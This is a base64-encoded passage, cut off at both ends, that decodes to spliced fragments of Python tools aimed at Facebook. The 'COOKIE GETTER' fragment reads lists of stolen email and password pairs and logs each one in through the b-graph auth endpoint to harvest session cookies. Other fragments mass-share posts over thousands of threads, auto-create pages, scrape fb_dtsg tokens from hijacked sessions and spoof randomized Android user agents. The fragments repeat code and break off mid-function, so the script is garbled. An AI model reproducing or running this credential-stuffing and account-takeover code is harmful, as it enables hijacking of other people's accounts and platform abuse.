gxYlszODsyOzE3MzsyNTU7NDdtQ29va2llcycpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIAogICAgaWYgdG90YWxfbGl2ZSA9PSAwOgogICAgICAgIHN5cy5leGl0KCkKCiAgICBwcmludChmIiAgICB7Z3JlZW594pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzdHQgPSAwCgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MjAwMCkgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlcyA9IFtdCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgZm9yIHRhY2ggaW4gYWxsOgogICAgICAgICAgICAgICAgaWYgc3R0ID49IHRvdGFsX3NoYXJlOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBmdXR1cmVzLmFwcGVuZChleGVjdXRvci5zdWJtaXQoc2hhcmUsIHRhY2gsIGlkX3NoYXJlKSkKICAgICAgICAgICAgICAgIHN0dCArPSAxCiAgICAgICAgICAgICAgICBwcmludChmJ1x4MWJbMzg7MjsxNzM7MjU1OzQ3bVNoYXJlOiArIFx4MWJbMzg7MjsyMzM7MjMzOzIzM217c3R0fScsIGVuZD0nXHInKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChkZWxheSkKICAgICAgICAgICAgaWYgc3R0ID49IHRvdGFsX3NoYXJlOgogICAgICAgICAgICAgICAgYnJlYWsKCiAgICBnb21lX3Rva2VuLmNsZWFyKCkKICAgIGlucHV0KCdceDFiWzM4OzI7MTczOzI1NTs0N21bKl0gXHgxYlszODsyOzIzMzsyMzM7MjMzbUVudGVyXl5cMDMzWzBtJykKCmltcG9ydCBvcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHV1aWQKaW1wb3J0IHJhbmRvbQpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHB0CmZyb20gcmljaCBpbXBvcnQgcHJpbnQgYXMgcnAKZnJvbSByaWNoLnBhbmVsIGltcG9ydCBQYW5lbCBhcyBwYW4KCgoKaW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdXVpZAppbXBvcnQgcmFuZG9tCmZyb20gcmVxdWVzdHMgaW1wb3J0IHBvc3QgYXMgcHQKZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBycApmcm9tIHJpY2gucGFuZWwgaW1wb3J0IFBhbmVsIGFzIHBhbgppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHV1aWQKZGFya2JsdWUgPSAiXDAzM1szNG0iCmdyZWVuID0gIlwwMzNbMTszMm0iCnJlZCA9ICJcMDMzWzE7MzFtIgp5ZWxsb3cgPSAiXDAzM1sxOzMzbSIKc2t5Ymx1ZSA9ICJcMDMzWzE7MzZtIgpibHVlID0gIlwwMzNbMTszNG0iCmxpZ2h0Ymx1ZSA9ICJcMDMzWzM4OzU7ODFtIgp3aGl0ZSA9ICJcMDMzWzE7MzdtIgpSID0gIlwwMzNbMzFtIiAgIyBSZWQKRyA9ICJcMDMzWzMybSIgICMgR3JlZW4KWSA9ICJcMDMzWzMzbSIgICMgWWVsbG93CkIgPSAiXDAzM1szNG0iICAjIEJsdWUKTSA9ICJcMDMzWzM1bSIgICMgTWFnZW50YQpQID0gIlwwMzNbMzZtIiAgIyBDeWFuCkMgPSAiXDAzM1szN20iICAjIFdoaXRlCmRlZiBjbGVhcl9zY3JlZW4oKToKICAgIGlmICd0ZXJtdXgnIGluIHBsYXRmb3JtLnN5c3RlbSgpLmxvd2VyKCk6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBlbGlmIHBsYXRmb3JtLnN5c3RlbSgpLmxvd2VyKCkgPT0gJ3dpbmRvd3MnOgogICAgICAgIG9zLnN5c3RlbSgnY2xzJykKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCgpkZWYgcmFuZGMoKToKICAgIHJldHVybiByYW5kb20uY2hvaWNlKFtSLCBHLCBZLCBCLCBNLCBQLCBDXSkKCmRlZiBsb2dvKCk6CiAgICBycChwYW4oZiIiIntyYW5kYygpfQoK4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWX4paR4paR4paI4paI4pWXCuKVmuKWiOKWiOKVl+KWkeKWiOKWiOKVlOKVneKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQrilpHilZrilojilojilojilojilZTilZ3ilpHilojilojilZHilpHilpHilpHilojilojilZHilZrilojilojilojilojilojilZfilpHilojilojilojilojilojilojilojilZEK4paR4paR4pWa4paI4paI4pWU4pWd4paR4paR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRCuKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQrilpHilpHilpHilZrilZDilZ3ilpHilpHilpHilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilZrilZDilZ3ilpHilpHilZrilZDilZ0KICAgICAgICAgICAgICAgICAgIiIiLAogICAgICAgICAgIHRpdGxlPWYie1l9Q09PS0lFIEdFVFRFUiIsIHN1YnRpdGxlPWYie1J9REVWRUxPUCBCWSBZIFUgUyBIICIsIGJvcmRlcl9zdHlsZT0iYm9sZCB5ZWxsb3ciKSkKCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCgpkZWYgZ2V0X2ZpbGVfcGF0aCgpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHJldHVybiBpbnB1dChmIiAgICAge2dyZWVufXtDfShFbnRlciBwYXRoIHRvIGZpbGUgd2l0aCBlbWFpbCBhbmQgcGFzc3dvcmQpOn4gIikKcHJpbnQoZiIgICIpCgpkZWYgZ2V0X2Nvb2tpZV9zdG9yYWdlX3BhdGgoKToKICAgIHByaW50KGYiICAgIHtyZWR94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICByZXR1cm4gaW5wdXQoZiIgICAgIHt5ZWxsb3d9e0N9KEVudGVyIHBhdGggdG8gc3RvcmUgY29va2llcyk6fiAiKQoKZGVmIHJlYWRfY3JlZGVudGlhbHMoZmlsZV9wYXRoKToKICAgIGNyZWRlbnRpYWxzID0gW10KICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgICAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICAgICAgbGluZSA9IGxpbmUuc3RyaXAoKQogICAgICAgICAgICBpZiAnfCcgaW4gbGluZToKICAgICAgICAgICAgICAgIHVpZCwgcGFzc3dvcmQgPSBsaW5lLnNwbGl0KCd8JywgMSkKICAgICAgICAgICAgICAgIGNyZWRlbnRpYWxzLmFwcGVuZCgodWlkLnN0cmlwKCksIHBhc3N3b3JkLnN0cmlwKCkpKQogICAgICAgICAgICBlbGlmIGxpbmU6CiAgICAgICAgICAgICAgICBwcmludChmIldhcm5pbmc6IFNraXBwaW5nIGludmFsaWQgbGluZSBmb3JtYXQ6IHtsaW5lfSIpCiAgICAgICAgICAgICAgICAKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3I6IEZpbGUgbm90IGZvdW5kIHtmaWxlX3BhdGh9OiB7c3RyKGUpfSIpCiAgICAKICAgCiAgICByZXR1cm4gY3JlZGVudGlhbHMKCgpkZWYgY3VzZXIodXNlciwgcGFzc3cpOgogICAgYWNjZXNzVG9rZW4gPSAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJwogICAgZGF0YSA9IHsKICAgICAgICAnYWRpZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICdmb3JtYXQnOiAnanNvbicsCiAgICAgICAgJ2RldmljZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICdjcGwnOiAndHJ1ZScsCiAgICAgICAgJ2ZhbWlseV9kZXZpY2VfaWQnOiBzdHIodXVpZC51dWlkNCgpKSwKICAgICAgICAnY3JlZGVudGlhbHNfdHlwZSc6ICdkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQnLAogICAgICAgICdlbWFpbCc6IHVzZXIsCiAgICAgICAgJ3Bhc3N3b3JkJzogcGFzc3csCiAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc1Rva2VuLAogICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsCiAgICAgICAgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywKICAgIH0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiAiRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCA4LjAuMDsgU00tQTcyMEYgQnVpbGQvUjE2TlcpIFtGQkFOL09yY2EtQW5kcm9pZDtGQkFWLzE5Ni4wLjAuMjkuOTk7RkJQTi9jb20uZmFjZWJvb2sub3JjYTtGQkxDL2VuX1VTO0ZCQlYvMTM1Mzc0NDc5O0ZCQ1IvU01BUlQ7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQkRWL1NNLUE3MjBGO0ZCU1YvOC4wLjA7RkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCX0ZXLzE7XSIsCiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICdIb3N0JzogJ2dyYXBoLmZhY2Vib29rLmNvbScsCiAgICB9CiAgICByZXNwb25zZSA9IHB0KCJodHRwczovL2ItZ3JhcGguZmFjZWJvb2suY29tL2F1dGgvbG9naW4iLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSwgYWxsb3dfcmVkaXJlY3RzPUZhbHNlKQogICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQoKZGVmIHJ1bmluZygpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZpbGVfcGF0aCA9IGdldF9maWxlX3BhdGgoKQogICAgc3RvcmFnZV9wYXRoID0gZ2V0X2Nvb2tpZV9zdG9yYWdlX3BhdGgoKSAgIyBHZXQgcGF0aCBmb3Igc3RvcmluZyBjb29raWVzCiAgICBjcmVkZW50aWFscyA9IHJlYWRfY3JlZGVudGlhbHMoZmlsZV9wYXRoKQoKICAgIGlmIG5vdCBjcmVkZW50aWFsczoKICAgICAgICBwcmludChmIntSfU5vIGNyZWRlbnRpYWxzIGZvdW5kIGluIHRoZSBmaWxlLiIpCiAgICAgICAgcmV0dXJuCiAgICAgCiAgICBwcmludChmIiAgICAgIHtyZWR9Rk9VTkQge2xlbihjcmVkZW50aWFscyl9IHtncmVlbn1DUkVERU5USUFMUyAhLi4uIikKCiAgICBmb3IgdXNlciwgcGFzc3cgaW4gY3JlZGVudGlhbHM6CiAgICAgICAgcmVzcG9uc2UgPSBjdXNlcih1c2VyLCBwYXNzdykKCiAgICAgICAgaWYgInNlc3Npb25fa2V5IiBpbiByZXNwb25zZToKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBjb29raWVfc3RyID0gJzsgJy5qb2luKGYne2lbIm5hbWUiXX09e2lbInZhbHVlIl19JyBmb3IgaSBpbiByZXNwb25zZS5nZXQoJ3Nlc3Npb25fY29va2llcycsIFtdKSkKICAgICAgICAgICAgY2xlYXJfc2NyZWVuKCkKICAgICAgICAgICAgam92YW4oKQogICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1DT09LSUUge3llbGxvd306IHt3aGl0ZX17Q317Y29va2llX3N0cn0iKQogICAgICAgICAgICAKICAgICAgICAgICAgd2l0aCBvcGVuKHN0b3JhZ2VfcGF0aCwgJ2EnKSBhcyBmOiAgIyBVc2UgdGhlIHVzZXItZGVmaW5lZCBwYXRoIGZvciBzdG9yaW5nIGNvb2tpZXMKICAgICAgICAgICAgICAgIGYud3JpdGUoY29va2llX3N0ciArICdcbicpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7Un1JTlZBTElEL0NIRUNLUE9JTlQgZm9yIFVTRVIgSUQ6IHtDfXt1c2VyfSIpCgogICAgcHJpbnQoZiJ7R31Qcm9jZXNzaW5nIGNvbXBsZXRlLiBBbGwgY3JlZGVudGlhbHMgaGF2ZSBiZWVuIHByb2Nlc3NlZC4iKQoKIyBSdW4gbWFpbigpIG9ubHkgd2hlbiBzY3JpcHQgaXMgZXhlY3V0ZWQgZGlyZWN0bHkKZGVmIGJpdHooKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiAgICAge3llbGxvd31bMV0ge2dyZWVufUdFVCBDT09LSUUiKQogICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9WzJdIHtncmVlbn1BVVRPIENSRUFURSBQQUdFIikKICAgIHByaW50KGYiICAgIHtyZWR94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBudW1fcmVhY3Rpb25zID0gaW50KGlucHV0KGYnICAgICB7cmVkfUVudGVyIE9wdGlvbjogJykpCgogICAgaWYgbnVtX3JlYWN0aW9ucyA9PSAxOgogICAgICAgIHJ1bmluZygpCiAgICBlbGlmIG51bV9yZWFjdGlvbnMgPT0gMjoKICAgICAgICBoYWNrZXpyKCkgIyBQbGFjZWhvbGRlciBmb3IgZnVydGhlciBpbXBsZW1lbnRhdGlvbgogICAgZWxzZToKICAgICAgICBwcmludChmIntSfUludmFsaWQgb3B0aW9uIHNlbGVjdGVkLiIpCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIEZvcmUsIFN0eWxlCmltcG9ydCBvcwoKIyBJbml0aWFsaXplIGNvbG9yYW1hCmluaXQoKQoKY2xhc3MgUmVnUHJvNToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKSAtPiBOb25lOgogICAgICAgIHNlbGYuY29va2llcyA9IGNvb2tpZXMKICAgICAgICBzZWxmLmlkX2FjYyA9IHNlbGYuY29va2llcy5zcGxpdCgnY191c2VyPScpWzFdLnNwbGl0KCc7JylbMF0KICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYXV0aG9yaXR5JzogJ3d3dy5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmknLAogICAgICAgICAgICAnY29va2llJzogc2VsZi5jb29raWVzLAogICAgICAgICAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2xpZ2h0JywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEwNiIsICJHb29nbGUgQ2hyb21lIjt2PSIxMDYiLCAiTm90O0E9QnJhbmQiO3Y9Ijk5IicsCiAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8wJywKICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciV2luZG93cyInLAogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLAogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA2LjAuMC4wIFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnMTM2NicsCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHVybF9wcm9maWxlID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWUnLCBoZWFkZXJzPWhlYWRlcnMpLnVybAogICAgICAgIHByb2ZpbGUgPSByZXF1ZXN0cy5nZXQodXJsX3Byb2ZpbGUsIGhlYWRlcnM9aGVhZGVycykudGV4dAoKICAgICAgICAjIEluaXRpYWxpemUgZmJfZHRzZyB0byBOb25lCiAgICAgICAgc2VsZi5mYl9kdHNnID0gTm9uZQogICAgICAgIAogICAgICAgICMgVHJ5IHRvIGZpbmQgZmJfZHRzZyB1c2luZyBtdWx0aXBsZSBwYXR0ZXJucwogICAgICAgIHBhdHRlcm5zID0gWwogICAgICAgICAgICAneyJuYW1lIjoiZmJfZHRzZyIsInZhbHVlIjoiJywgICMgUHJpbWFyeSBwYXR0ZXJuCiAgICAgICAgICAgICcsImYiOiInLCAgICAgICAgICAgICAgICAgICAgICAjIFNlY29uZGFyeSBwYXR0ZXJuCiAgICAgICAgICAgICMgQWRkIG1vcmUgcGF0dGVybnMgaWYgbmVjZXNzYXJ5CiAgICAgICAgXQoKICAgICAgICBmb3IgcGF0dGVybiBpbiBwYXR0ZXJuczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5mYl9kdHNnID0gcHJvZmlsZS5zcGxpdChwYXR0ZXJuKVsxXS5zcGxpdCgnIn0sJylbMF0KICAgICAgICAgICAgICAgIGJyZWFrICAjIEJyZWFrIGlmIHRoZSBwYXR0ZXJuIGlzIGZvdW5kCiAgICAgICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOgogICAgICAgICAgICAgICAgY29udGludWUgICMgVHJ5IHRoZSBuZXh0IHBhdHRlcm4KCiAgICAgICAgaWYgbm90IHNlbGYuZmJfZHRzZzoKICAgICAgICAgICAga29sb3IoIkVycm9yOiBmYl9kdHNnIG5vdCBmb3VuZCBpbiBwcm9maWxlIGRhdGEuIiwgJ3JlZCcpCiAgICBpbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRocmVhZGluZwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHBsYXRmb3JtCiMgQ29sb3IgY29kZXMgZm9yIGZvcm1hdHRpbmcgb3V0cHV0CnB1cnBsZSA9ICJcMDMzWzE7MzVtIgpibHVlID0gIlwwMzNbMzRtIgpncmVlbiA9ICJcMDMzWzE7MzJtIgpyZWQgPSAiXDAzM1sxOzMxbSIKeWVsbG93ID0gIlwwMzNbMTszM20iCndoaXRlID0gIlwwMzNbMTszN20iCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBpZiAndGVybXV4JyBpbiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxpZiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpID09ICd3aW5kb3dzJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudCgpOgogICAgZmJhdiA9IGYie3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfSIKICAgIGZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQogICAgZmJydiA9ICcwJwogICAgcmFuZG9tX3NlZWQgPSByYW5kb20uUmFuZG9tKCkKICAgIGFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgogICAgIyBSYW5kb21seSB2YXJ5IHRoZSBBbmRyb2lkIE9TIHZlcnNpb24sIGRldmljZSwgYW5kIGFwcCB2ZXJzaW9uIGZvciByZWFsaXNtCiAgICBkZXZpY2UgPSByYW5kb20uY2hvaWNlKFsiSFVBV0VJIE1BUi1MWDFNIiwgIlNhbXN1bmcgU00tRzk2MEYiLCAiT25lUGx1cyBHTTE5MTMiXSkKICAgIGZiYXZfdmVyc2lvbiA9IHN0cihyYW5kb20ucmFuZGludCg0OSwgMTUwKSkgICMgVXBkYXRlZCByYW5nZSBmb3IgRkJBViB2ZXJzaW9ucwogICAgZmJidl92ZXJzaW9uID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpCiAgICBjYXJyaWVyID0gcmFuZG9tLmNob2ljZShbIk9vcmVkb28gVE4iLCAiT3JhbmdlIiwgIlZvZGFmb25lIiwgIlQtTW9iaWxlIl0pCgogICAgdWFfYmdyYXBoID0gZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZfdmVyc2lvbn0uMC4wLntyYW5kb20ucmFuZHJhbmdlKDIwLCA0OSl9LntyYW5kb20ucmFuZGludCgxMSwgOTkpfTtGQkJWL3tmYmJ2X3ZlcnNpb259OycgXAogICAgICAgICAgICAgICAgZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZ9O0ZCQlYve2ZiYnZ9O0ZCRE0ve3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTA3fX07RkJMQy9mcl9GUjsnIFwKICAgICAgICAgICAgICAgIGYnRkJSVi97ZmJydn07RkJDUi97Y2Fycmllcn07RkJNRi97ZGV2aWNlLnNwbGl0KCIgIilbMF19O0ZCQkQve2RldmljZS5zcGxpdCgiICIpWzBdfTsnIFwKICAgICAgICAgICAgICAgIGYnRkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYve2RldmljZX07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwogICAgCiAgICByZXR1cm4gdWFfYmdyYXBoCgp1YV9iZ3JhcGggPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKCgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzIGFzIHRocmVhZAppbXBvcnQgb3MKaW1wb3J0IHN0cmluZwoKIyBSYW5kb20gRkIgdmVyc2lvbiBnZW5lcmF0aW9uCmZiYXYgPSBmJ3tyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0nCmZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQpmYnJ2ID0gJzAnCnJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCmFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgojIFVzZXIgYWdlbnQgc3RyaW5nCnVhX2JncmFwaCA9ICdbRkJBTi9GQjRBO0ZCQVYvJyArIHN0cihyYW5kb20ucmFuZGludCg0OSwgNjYpKSArICcuMC4wLicgKyBzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgNDkpKSArIHN0cihyYW5kb20ucmFuZGludCgxMSwgOTkpKSArICc7RkJCVi8nICsgc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpICsgJzsnICsgJ1tGQkFOL0ZCNEE7RkJBVi8nICsgZmJhdiArICc7RkJCVi8nICsgZmJidiArICc7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjEwN307RkJMQy9mcl9GUjtGQlJWLycgKyBmYnJ2ICsgJztGQkNSL09vcmVkb28gVE47RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTUFSLUxYMU07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwoKZGVmIGJncmFwaCh1aWQsIHB3LCBwYXRoX2ZpbGUsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdWlkcyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICAKICAgICAgICBpZiB1aWQgaW4gZXhpc3RpbmdfdWlkczoKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9W0lORk9dIHtyZWR9QUNDT1VOVCAtLT4ge3doaXRlfXt1aWR9IHtyZWR9YWxyZWFkeSBleGlzdHMuIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi